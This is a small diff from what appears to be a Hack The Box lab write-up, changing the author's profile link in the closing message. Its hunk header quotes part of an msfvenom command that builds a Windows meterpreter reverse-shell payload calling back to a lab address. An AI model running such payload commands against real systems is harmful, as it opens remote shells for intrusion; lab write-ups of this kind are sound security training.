@@ -604,5 +604,5 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.196 LPORT=443 -f 
 ```bash
 ```
 
->I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/profile/1504363) and give me a respect 😁. Happy Hacking!!👾
+>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
 {: .prompt-tip }
